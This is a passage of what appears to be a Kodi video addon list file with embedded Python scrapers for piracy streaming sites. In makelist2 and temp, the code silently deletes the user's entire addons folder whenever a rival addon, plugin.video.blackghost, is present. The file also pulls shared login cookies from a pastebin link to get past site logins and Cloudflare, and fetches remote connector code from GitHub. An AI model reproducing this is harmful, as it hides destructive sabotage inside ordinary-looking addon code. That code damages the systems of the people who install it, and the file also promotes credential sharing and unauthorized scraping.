  numero_total = len(items)
  return [('[COLOR aqua]Cristal Azul, Productoras:[COLOR white] ('+str(numero_total)+')', ' ', 'https://i.imgur.com/5kY0BRB.png')] + sorted(items) + [('[COLOR white]No hay mas resultados...', ' ', 'https://i.imgur.com/5kY0BRB.png')]
]]></expres>
<page></page>
</regex>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist.param2]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m,url=url):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)"item movies">.*?href="(.*?)".*?src="(.*?)".*?alt="(.*?)".*?p>(.*?)<.*?span>.(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
        response = six.ensure_str(response)
        data = re.findall(patron, response)
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
            response = six.ensure_str(response)
            data = re.findall(patron, response)
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            return [(' ', 'https://i.imgur.com/r6aXooD.jpg', ' ', '[COLOR white]Web en Mantenimiento', ' ')]
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        titulo = item[2]
        titulo = six.ensure_str(titulo).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        anio = item[3]
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL
 
  if 'gamovideo' in url:
    try:
        if 'https' in url:
            url = url.replace('https','http')
        ua = AgenteCristal()
        headers = {"User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Alt-Used": "gamovideo.com:443","Upgrade-Insecure-Requests": "1","Cache-Control": "max-age=0", "cookie": "gam=1"}
        source = requests.get(url, headers=headers, verify=False).text
        source = six.ensure_str(source)
        #ArchivoDestino = xbmc.translatePath('special://home/addons/plugin.video.cristalazul/')
        #open(ArchivoDestino + 'html.txt','wb').write(source)
        pack = re.findall('javascript.*?(eval\(function\(p,a,c,k,e,d.*)', source)[0]
        unpack = six.ensure_str(jsunpack.unpack(pack)).replace('\\', '')    
        u = re.findall('file:\s*"(http.*?)"', unpack)[0]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
            #u = xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]enlace caido [/COLOR], 4000)")
    return u
  elif '.torrent' in url or 'magnet:' in url:
    addon = xbmcaddon.Addon('plugin.video.cristalazul')
    elecion_torrent = addon.getSetting('TodosTorrent')
    if 'Ninguno' == elecion_torrent:
      import xbmcgui
      dialog = xbmcgui.Dialog()
      ret = dialog.select('Reproducir con:', ['[COLOR white]Quasar[/COLOR]', '[COLOR white]Torrenter[/COLOR]', '[COLOR white]Elementum[/COLOR]', '[COLOR white]Torrentin[/COLOR]'])
      channels = [
   'plugin://plugin.video.quasar/play?uri='+url+'&image=imageurl&player=0',
   'plugin://plugin.video.torrenter/?action=playSTRM&url='+url+'&image=imageurl&player=0',
   'plugin://plugin.video.elementum/play?uri='+url+'&image=imageurl&player=0',
   'plugin://plugin.video.torrentin/?uri='+url+'&image=imageurl&player=0']  
      return channels[ret]
    elif 'Quasar' == elecion_torrent:
      return 'plugin://plugin.video.quasar/play?uri='+url+'&image=imageurl&player=0'
    elif 'Torrentin' == elecion_torrent:
      return 'plugin://plugin.video.torrentin/?uri='+url+'&image=imageurl&player=0'
    elif 'Torrenter' == elecion_torrent:
      return 'plugin://plugin.video.torrenter/?action=playSTRM&url='+url+'&image=imageurl&player=0'
    else:
      return 'plugin://plugin.video.elementum/play?uri='+url+'&image=imageurl&player=0'
  elif 'supervideo.tv' in url:
    try:
        ua = AgenteCristal()
        s=requests.session()
        rsource=s.get(url, headers={'User-Agent': ua},  verify=False)
        source=s.get(url, headers={'User-Agent': ua},  verify=False)
        pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', six.ensure_str(source.text))[0]
        unpack=jsunpack.unpack(pack)
        u = re.findall('file:\s*"(http.{0,100}mp4)"', unpack)[0]+'|User-Agent='+ua
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'mixdrop' in url:
    url = url.replace('/f/','/e/').replace('.co','.to')
    try:
        ua = AgenteCristal()
        scraper = cfscrape.create_scraper()
        source=scraper.get(url, headers={'User-Agent':ua}, verify=False)
        source_text = six.ensure_str(source.text)
        if 'eval(function' in source_text:
           pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', source_text)[0]
           unpack=jsunpack.unpack(pack)
           url2 = 'https:' + re.findall('wurl="(.*?)"', unpack)[0]
           servidor_inicial = re.findall('//(.*?)/',url2)[0]
           cambio_servidor = re.findall('ipr=(.*?)"', six.ensure_str(requests.post('http://www.mon-ip.com/direccion-ip-sitio.php', headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0','referer':'http://www.mon-ip.com/direccion-ip-sitio.php','x-requested-with':'XMLHttpRequest'},data={'add':'1','domaine':servidor_inicial,'mss':''}).text))[0]
           servidor_final = url2.replace(servidor_inicial,cambio_servidor)
           return servidor_final
        else:
          source2 = 'https://mixdrop.to' + re.findall('"(.*?)\"',source_text)[0] + 'https://mixdrop.to/'
          source3 = scraper.get(source2, headers={'User-Agent':ua}, verify=False)
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', six.ensure_str(source3.text))[0]
          unpack=jsunpack.unpack(pack)
          return 'https:' + re.findall('wurl="(.*?)"', unpack)[0]
    except:
      try:
          u = resolveurl.resolve(url)
      except Exception as e:
          u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
      return u

  elif 'google' in url:
    try:
        id = re.findall("([-\w]{25,})", url)[0]
        u = 'plugin://plugin.video.gdrive/?mode=video&amp;instance=gdrive1&amp;filename=' + id + '&amp;content_type=video'
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

  elif 'dailymotion' in url:
    try:
        url = 'https://www.dailymotion.com/embed/video/'+url.split('/')[-1]
        m3u8 = re.findall('URL"."url":"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':'ipad'},verify=False).content))[0].replace('\/', '/')
        return re.findall('\s*(h.*?)\s',six.ensure_str(requests.get(m3u8,headers={'user-agent':'ipad'},verify=False).content))[-1]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

  elif 'mega' in url:
    try:
      video_urls = []


      c = Client(url=url.replace('/file/','/embed#!').replace('/embed/','/embed#!').replace('#!#!','#!'), 
      is_playing_fnc=xbmc.Player().isPlaying())
      files = c.get_files()

      if len(files) > 5:
        media_url = c.get_play_list()
        video_urls.append([get_filename_from_url(media_url)[-4:], media_url])
      else:
        for f in files:
            media_url = f["url"]
            video_urls.append([get_filename_from_url(media_url)[-4:], media_url])

      return video_urls[0][1]
    except Exception as e:
        return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))

  elif 'clipwatching' in url:
    try:
        ua = AgenteCristal()
        u = re.findall('sources:.*?"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0] + '|User-Agent=' + AgenteCristal()
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'cloudvideo' in url:
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cloudvideo.tv/'}, timeout=10, verify=False).content
        response = six.ensure_str(response)
        datos = re.findall('(?s)name="op" value="(.*?)".*?name="usr_login" value="(.*?)".*?name="id" value="(.*?)".*?name="fname" value="(.*?)".*?name="hash" value="(.*?)".*?name="imhuman" value="(.*?)"', response)
        source=requests.post(url,headers={'User-Agent':'Mozilla/5.0','referer':url},data={'op':datos[0][0],'usr_login':datos[0][1],'id':datos[0][2],'fname':urllib_parse.quote_plus(datos[0][3]),'referer':'','hash':datos[0][4],'imhuman':urllib_parse.quote_plus(datos[0][5])}).text
        source = six.ensure_str(source)
        pack = re.findall('javascript.*?(eval\(function\(p,a,c,k,e,d.*)', source)[0]
        unpack=jsunpack.unpack(pack)
        xbmc.log('miraaaaaaa: %s' % (unpack), xbmc.LOGNOTICE)
        u = re.findall('src:"(.*?)"', unpack)[0]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'vidoza' in url:
    try:
        mozhdr4 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html4 = requests.get(url, headers=mozhdr4, verify=False).text
        html4 = six.ensure_src(html4)
        u = re.findall('["\']?\s*(?:file|src)\s*["\']?\s*[:=,]?\s*["\'](?P<url>[^"\']+)(?:[^}>\]]+)["\']?\s*res', html4)[0] + '|User-Agent=' + AgenteCristal()
    except:
        u = xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]enlace caido [/COLOR], 4000)")
    return u
  elif 'gloria' in url:
    try:
        mozhdr4 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html4 = requests.get(url, headers=mozhdr4, verify=False).text
        html4 = six.ensure_src(html4)
        u = re.findall('(?:file|src)\s*=["\'](http.*?)["\']', html4)[0].replace('&amp;','&') + '|User-Agent=' + AgenteCristal()
    except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'videobin' in url:
    try:
        u = url.replace('.html', '.ogg') + '|User-Agent=' + AgenteCristal()
    except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'ulozto' in url:
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Referer': 'https://uloz.to/'}
    page = requests.get(url, headers=headers, cookies=Cookie_Jar).content
    page = six.ensure_src(page)
    try:
      eurl = re.findall('getPreviewURL":"(.*?)"', page)[0]
      eurl = 'https://uloz.to' + eurl.replace('\/','/')
      url = requests.get(eurl, headers=headers, cookies=Cookie_Jar).json()['streamPreviewUrl']
      u='{}|{}'.format(url, urllib_parse.urlencode(headers))
    except:
      try:
        u = 'https:' + re.findall('URL":"(.*?)"', page)[0].replace('\/','/')
      except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'flixplayer' in url:
    try:
        ua = AgenteCristal()
        u = re.findall('link":"(.*?mp4)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0] + '|User-Agent=' + AgenteCristal()
    except:
        try:
            Link = re.findall('link":"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0].replace('embed-','')
            u = resolveurl.resolve(Link)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'openload' in url:
    try:
        mozhdr = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Servidor Openload muerto [/COLOR], 4000)")
    except:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Servidor Openload muerto [/COLOR], 4000)")
    return u
  elif 'uptobox' in url:
    try:
        mozhdr3 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html3 = requests.get(url, headers=mozhdr3, verify=False).text
        html3 = six.ensuere_str(html3)
        part1 = re.findall('(by its owner|uploaded with File Uploader)', html3)[0]
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    except:
        H = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul_[COLOR gold]Uptobox[/COLOR],[COLOR gold]Limite 120minutos diarios con esta ip[/COLOR], 5000)")
        u = resolveurl.resolve(url)
    return u
  else:
    try:
        u = resolveurl.resolve(url)
    except:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

def get_filename_from_url(url=url.replace('/file/','/embed#!').replace('/embed/','/embed#!').replace('#!#!','#!')):
    parsed_url = urllib_parse.urlparse(url)
    try:
        filename = parsed_url.path
    except:
        if len(parsed_url) >= 4:
            filename = parsed_url[2]
        else:
            filename = ""

    if "/" in filename:
        filename = filename.split("/")[-1]

    return filename

def AgenteCristal():
    url= 'https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/AgenteCristal'
    agente = {'User-Agent': 'Mozilla/5.0'}
    extraer = requests.get(url, headers=agente)
    AgenteCristal = re.findall("(.*?)CRISTAL", six.ensure_str(extraer.text))[0]
    return AgenteCristal
 
]]></expres>
            <page></page>
        </regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
